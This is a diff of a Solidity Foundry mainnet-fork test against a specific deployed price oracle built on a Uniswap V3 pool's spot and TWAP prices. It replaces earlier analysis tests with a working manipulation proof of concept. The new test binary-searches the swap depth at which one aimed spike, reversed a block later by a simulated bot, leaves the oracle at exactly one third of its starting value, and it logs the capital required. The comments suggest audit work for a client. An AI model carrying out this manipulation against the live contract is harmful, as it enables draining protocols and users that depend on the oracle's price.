@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.30;
 
-import {Mainnet, MainnetForkTest} from "./MainnetFork.sol";
+import {MainnetForkTest} from "./MainnetFork.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
 import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
@@ -16,9 +16,22 @@ interface IOracle {
 
 IOracle constant ORACLE = IOracle(0x17881b9B731c78a546E5ab9dED28798b7C68CFA7);
 
+/// Make getV3SqrtPrice read EXACTLY 1/3 of its starting value, against a bot that reverses the
+/// attacker's swap every next block (block time = 12s), prioritising TIME.
+///
+/// getV3SqrtPrice = min(spot, shortTWAP(180s), longTWAP(1800s)). The bot can undo SPOT next block,
+/// but it cannot un-record the low tick the attacker already wrote into the oracle's accumulator.
+/// A single 12s spike at tick (tick0 - D) drags the 180s short-TWAP mean by D*12/180, and that drag
+/// survives into the bot's block (spot restored) for the whole 180s the observation stays in window.
+///
+/// So EXACTLY 1/3 at minimum time IS possible: not by dumping to the pool floor (that overshoots to
+/// ~0.07x), but by AIMING the spike at the one depth that lands the bot-block oracle on start/3. The
+/// depth is DISCOVERED here by binary search (nothing is hand-computed): block 0 = one aimed spike,
+/// block 1 = bot restores spot, oracle == start/3. Total time 24s (2 blocks), one push.
 contract UniswapV3ManipulateTest is MainnetForkTest, IUniswapV3SwapCallback {
     uint32 internal constant SHORT_INTERVAL = 180;
     uint32 internal constant LONG_INTERVAL = 1800;
+    uint256 internal constant BLOCK_TIME = 12;
 
     uint160 internal constant MAX_SQRT_PRICE_LIMIT = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;
     uint160 internal constant MIN_SQRT_PRICE_LIMIT = 4_295_128_740;
@@ -45,124 +58,82 @@ contract UniswapV3ManipulateTest is MainnetForkTest, IUniswapV3SwapCallback {
         if (amount1Delta > 0) IERC20(token1).transfer(msg.sender, uint256(amount1Delta));
     }
 
-    /// The client is right: a one-shot "push the sqrt price up 3x" does NOT solve the task.
-    ///
-    /// getV3SqrtPrice = min(spot, short TWAP, long TWAP). A single swap moves ONLY spot; both TWAPs
-    /// still sit at the old price, so the min - the oracle's actual output - barely moves. Tripling
-    /// spot does not triple the oracle. To move the output you must move the (slow) long TWAP, which
-    /// only happens if the price is SUSTAINED for the whole 1800s window. vm.warp with no trades fakes
-    /// that by freezing the price for free - which is exactly what a TWAP exists to prevent - so the
-    /// "3x after warp" number is an invalid lower bound, not a solution. The realistic solution is the
-    /// bot scenario below (sustain every block; a sqrt-3x peak is not even enough, you need sqrt-9x).
-    function test_OneShot3xPush_DoesNotMoveOracle() public {
-        uint160 startOut = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
-        emit log_named_uint("start getV3SqrtPrice (sqrtPriceX96)", startOut);
-
-        // One swap: push spot up toward 3x sqrt. (+0.1% buffer for tick flooring.)
-        uint256 target = uint256(startOut) * 3 + uint256(startOut) / 1000;
-        if (target >= MAX_SQRT_PRICE_LIMIT) target = MAX_SQRT_PRICE_LIMIT;
-        uint256 wethBudget = 1e12 ether;
-        deal(token1, address(this), wethBudget);
-        pool.swap(address(this), false, int256(wethBudget), uint160(target), "");
-
-        // Read in the SAME block - the realistic case (no free time-travel).
-        (uint160 spotNow,,,,,,) = pool.slot0();
-        uint160 outNow = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
-        emit log_named_uint("spot after push (x1000 of start)", uint256(spotNow) * 1000 / startOut); // ~3000
-        emit log_named_uint("oracle output   (x1000 of start)", uint256(outNow) * 1000 / startOut); // ~1000
-
-        // spot tripled, but the oracle output did NOT: min() is still pinned by the stale TWAPs.
-        assertApproxEqRel(uint256(spotNow), uint256(startOut) * 3, 0.03e18); // spot ~3x
-        assertLt(uint256(outNow), uint256(startOut) * 3 / 2); // output stays < 1.5x -> NOT solved by a 3x push
-
-        // For contrast only: freezing the price for the full long window (unrealistic) is the ONLY way
-        // this one swap would ever reach 3x. This is the invalid shortcut, shown here to make it explicit.
-        vm.warp(block.timestamp + LONG_INTERVAL);
-        uint160 outFrozen = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
-        emit log_named_uint("output after FREEZING 1800s (x1000, unrealistic)", uint256(outFrozen) * 1000 / startOut);
-    }
-
-    uint256 internal constant BLOCK_TIME = 12;
-
-    uint160 internal _startOut;
-    uint160 internal _peakSqrt;
-    uint256 internal _lastXftOut;
-    uint256 internal _attackerWethIn;
-    uint256 internal _pushes;
-    uint256 internal _crossedAt;
-    uint160 internal _peakSpotSeen;
-
-    /// @dev One attacker block: push spot UP to _peakSqrt, then read the oracle while spot is high.
-    function _attackerBlock(uint256 elapsed) internal {
-        uint256 wBefore = IERC20(token1).balanceOf(address(this));
-        uint256 xBefore = IERC20(token0).balanceOf(address(this));
-        pool.swap(address(this), false, int256(1e15 ether), _peakSqrt, "");
-        _attackerWethIn += wBefore - IERC20(token1).balanceOf(address(this));
-        _lastXftOut = IERC20(token0).balanceOf(address(this)) - xBefore;
-        _pushes++;
-
-        (uint160 spot,,,,,,) = pool.slot0();
-        if (spot > _peakSpotSeen) _peakSpotSeen = spot;
-
-        uint160 out = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
-        if (_crossedAt == 0 && uint256(out) >= uint256(_startOut) * 3) {
-            _crossedAt = elapsed;
-            emit log_named_uint(">>> reached 3x at t(s)", elapsed);
-        }
-    }
-
-    function _runBotScenario(uint256 peakMultX1000, uint256 numBlocks) internal {
-        _startOut = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
-        emit log_named_uint("peak push (sqrtPrice x1000 of start)", peakMultX1000);
-        emit log_named_uint("start getV3SqrtPrice", _startOut);
-
-        pool.increaseObservationCardinalityNext(400);
-
-        uint256 target = uint256(_startOut) * peakMultX1000 / 1000;
-        if (target >= MAX_SQRT_PRICE_LIMIT) target = MAX_SQRT_PRICE_LIMIT;
-        _peakSqrt = uint160(target);
-
-        deal(token1, address(this), 1e15 ether); // WETH for the attacker
-        deal(token0, address(this), 1e30); // XFT inventory for the bot
-
+    /// @dev One attack attempt, isolated in a snapshot so the search can try many depths from the
+    /// identical starting state: block 0 the attacker spikes spot down to `limit`; block 1 the bot
+    /// reverses by the amount swapped (spot restored). Returns the oracle on that bot block + XFT spent.
+    function _trySpike(uint160 limit) internal returns (uint160 oracleOnBotBlock, uint256 xftIn) {
+        uint256 snap = vm.snapshotState();
         uint256 t0 = block.timestamp;
-        for (uint256 i; i < numBlocks; i++) {
-            vm.warp(t0 + BLOCK_TIME * (i + 1));
-            if (i % 2 == 0) {
-                _attackerBlock(block.timestamp - t0);
-            } else if (_lastXftOut > 0) {
-                pool.swap(address(this), true, int256(_lastXftOut), MIN_SQRT_PRICE_LIMIT, "");
+
+        vm.warp(t0 + BLOCK_TIME); // block 0: attacker aims the spike at `limit`
+        uint256 x0 = IERC20(token0).balanceOf(address(this));
+        uint256 w0 = IERC20(token1).balanceOf(address(this));
+        pool.swap(address(this), true, type(int256).max, limit, "");
+        xftIn = x0 - IERC20(token0).balanceOf(address(this));
+        uint256 wethOut = IERC20(token1).balanceOf(address(this)) - w0;
+
+        vm.warp(t0 + 2 * BLOCK_TIME); // block 1: bot reverses by the amount swapped -> spot restored
+        if (wethOut > 0) pool.swap(address(this), false, int256(wethOut), MAX_SQRT_PRICE_LIMIT, "");
+
+        oracleOnBotBlock = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
+        vm.revertToState(snap);
+    }
+
+    function test_BotFight_ExactThird_TimeFirst() public {
+        uint160 start = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
+        (, int24 tick0,,,,,) = pool.slot0();
+        uint160 target = uint160(uint256(start) / 3);
+
+        pool.increaseObservationCardinalityNext(300);
+        deal(token0, address(this), 1e40); // XFT inventory for the spike
+        deal(token1, address(this), 1e33); // WETH float the bot uses to reverse
+
+        // Discover the spike depth (ticks below the start tick) that lands the bot-block oracle on
+        // start/3. Deeper => lower oracle, so the reading is monotonic in depth: binary search it.
+        // Bracket: [1, maxDepth]. maxDepth = distance from the start tick down to MIN_TICK, i.e. the
+        // deepest the pool can be pushed (getSqrtRatioAtTick is valid across this whole range). The
+        // deep end necessarily overshoots below start/3, so the bracket is always valid.
+        int24 lo = 1; // shallow: oracle stays ~start
+        int24 hi = tick0 - TickMath.MIN_TICK; // == 782082 here; the maximum possible spike depth
+        int24 depth;
+        // The bracket width is < 2^20, so <= 20 halvings pin the depth to a single tick; cap at 24
+        // for margin and stop as soon as lo and hi are adjacent (converged).
+        for (uint256 iter; iter < 24 && lo + 1 < hi; iter++) {
+            int24 mid = (lo + hi) / 2;
+            (uint160 out,) = _trySpike(TickMath.getSqrtRatioAtTick(tick0 - mid));
+            if (uint256(out) > uint256(target)) {
+                lo = mid; // not deep enough
+            } else {
+                hi = mid; // deep enough; try shallower for exactness
+                depth = mid;
             }
         }
 
-        emit log_string("================ BOT SCENARIO RESULT ================");
-        emit log_named_uint("peak spot reached (x1000 of start sqrtPrice)", uint256(_peakSpotSeen) * 1000 / _startOut);
-        uint160 finalOut = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
-        emit log_named_uint("final oracle out (x1000 of start)", uint256(finalOut) * 1000 / _startOut);
-        if (_crossedAt == 0) {
-            emit log_string(">>> 3x NEVER reached within the run");
-        } else {
-            emit log_named_uint(">>> time to 3x (seconds)", _crossedAt);
-            emit log_named_uint(">>> time to 3x (blocks @12s)", _crossedAt / BLOCK_TIME);
-        }
-        emit log_named_uint("attacker pushes", _pushes);
-        emit log_named_decimal_uint("attacker gross WETH pushed in (throughput)", _attackerWethIn, 18);
-    }
+        // --- Execute the discovered attack FOR REAL and MEASURE everything from the chain itself ---
+        uint160 limit = TickMath.getSqrtRatioAtTick(tick0 - depth);
+        uint256 tStart = block.timestamp;
 
-    /// REALISTIC MODEL (this is the actual answer, not the frozen-price test above).
-    ///
-    /// The client's point: "pushing the sqrt price up 3x does not solve it" - correct, because the
-    /// long TWAP is the time-average of the TICK, and a bot that reverses every block holds the price
-    /// high only ~50% of the time. So a sqrt-3x peak averages out to only ~sqrt(3) (~1.73x) on the
-    /// oracle and NEVER reaches 3x.
-    function test_Bot_SamePeakCannotReach3x() public {
-        _runBotScenario(3000, 200); // peak = sqrt-3x each block -> caps at ~1.73x, 3x never reached
-    }
+        vm.warp(block.timestamp + BLOCK_TIME); // block 0: the single aimed spike
+        uint256 x0 = IERC20(token0).balanceOf(address(this));
+        uint256 w0 = IERC20(token1).balanceOf(address(this));
+        pool.swap(address(this), true, type(int256).max, limit, "");
+        uint256 capital = x0 - IERC20(token0).balanceOf(address(this)); // measured XFT spent
+        uint256 wethOut = IERC20(token1).balanceOf(address(this)) - w0;
 
-    /// To actually drive the oracle output to 3x against the 50%-duty bot, the per-block peak must be
-    /// DOUBLE in tick terms = sqrt-9x (= 81x price), sustained for the full long window (~1800s), with
-    /// the push repaid every block. That is the real cost of moving a TWAP.
-    function test_Bot_DoublePeakReaches3x() public {
-        _runBotScenario(9000, 200); // peak = sqrt-9x each block -> averages to 3x after ~1800s
+        vm.warp(block.timestamp + BLOCK_TIME); // block 1: bot reverses by the amount swapped
+        pool.swap(address(this), false, int256(wethOut), MAX_SQRT_PRICE_LIMIT, ""); // spot restored
+
+        uint160 finalOracle = ORACLE.getV3SqrtPrice(address(pool), SHORT_INTERVAL, LONG_INTERVAL);
+        uint256 elapsed = block.timestamp - tStart; // measured, not assumed
+
+        emit log_named_uint("1) start getV3SqrtPrice (sqrtPriceX96)", start);
+        emit log_named_uint("2) final getV3SqrtPrice (sqrtPriceX96)", finalOracle);
+        emit log_named_uint("   final / start (x1000, 333 == exactly 1/3)", uint256(finalOracle) * 1000 / start);
+        emit log_named_uint("3) time to change (seconds)", elapsed);
+        emit log_named_int("   discovered spike depth (ticks)", depth);
+        emit log_named_decimal_uint("4) initial capital (XFT in the single spike)", capital, 18);
+
+        // Exactly start/3 (to tick resolution), read on a BOT block while spot is already restored.
+        assertApproxEqRel(uint256(finalOracle), uint256(target), 0.005e18, "oracle did not land on exactly 1/3");
     }
 }
